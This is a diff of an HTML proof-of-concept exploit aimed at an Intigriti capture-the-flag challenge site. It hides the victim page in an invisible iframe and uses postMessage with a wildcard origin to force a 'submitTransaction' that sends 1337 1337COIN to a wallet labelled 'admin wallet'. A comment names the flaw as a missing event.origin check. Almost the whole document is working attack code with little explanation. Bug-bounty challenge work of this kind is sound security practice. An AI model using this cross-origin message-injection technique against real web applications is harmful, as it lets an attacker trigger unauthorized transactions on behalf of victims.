@@ -1,27 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>postMessage Exploit PoC</title>
+</head>
 <body>
-<h1>Loading…</h1>
+    <h1>Loading…</h1>
 
-<iframe
-  id="victim"
-  src="https://challenge-0126.intigriti.io/buy-confirm.html?currency=1337COIN&price=1"
-  style="width:1px;height:1px;border:0;"
-></iframe>
+    <!-- Victim page -->
+    <iframe
+        id="victim"
+        src="https://challenge-0126.intigriti.io/marketplace.html?currency=1337COIN&price=1"
+        style="display:none"
+    ></iframe>
 
-<script>
-const iframe = document.getElementById("victim");
+    <script>
+        const iframe = document.getElementById('victim');
 
-iframe.onload = () => {
-  iframe.contentWindow.postMessage({
-    type: "submitTransaction",
-    transaction: {
-      toAddress: "174094f246eb6712e885d470519c0ad4d4",
-      currency: "1337COIN",
-      amount: 1
-    }
-  }, "*");
-};
-</script>
+        iframe.onload = () => {
+            const payload = {
+                id: 1, // injected as requested
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: "1997d44f99256913784aecf98255882ac6", // admin wallet
+                    currency: "1337COIN",
+                    amount: 1337
+                }
+            };
+
+            // Exploit: receiver does NOT validate event.origin
+            iframe.contentWindow.postMessage(payload, '*');
+        };
+    </script>
 </body>
 </html>
